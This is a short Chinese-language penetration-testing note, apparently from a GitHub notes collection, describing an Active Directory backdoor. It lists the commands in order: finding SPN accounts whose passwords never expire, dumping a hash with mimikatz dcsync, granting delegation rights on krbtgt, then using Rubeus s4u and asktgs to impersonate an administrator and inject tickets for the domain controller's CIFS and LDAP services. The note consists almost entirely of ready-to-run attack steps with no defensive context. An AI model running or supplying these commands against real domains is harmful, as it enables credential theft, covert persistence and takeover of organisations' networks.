	域控执行，寻找具备SPN且密码永不过期的账户
	>Get-ADUser -Filter * -Properties ServicePrincipalName,PasswordNeverExpires| ? {($_.ServicePrincipalName -ne "") -and ($_.PasswordNeverExpires -eq $true)}
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/553.png)

	使用mimikatz的dcsync提取用户hash
	>lsadump::dcsync /domain:zone.com /user:y
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/554.png)
	
	布置后门
	>Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount 账户
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/555.png)

	布置完成后利用，登录账户y
	触发后门
	>Rubeus.exe s4u /user:y /aes256:{aes256} /domain:zone.com /msdsspn:krbtgt /impersonateuser:godadmin
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/556.png)

	注入票据，获取域控的CIFS、LDAP服务
	>Rubeus.exe asktgs /ticket:{} /service:cifs/dc.zone.com,ldap/dc.zone.com /ptt
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/557.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/558.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/559.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/560.png)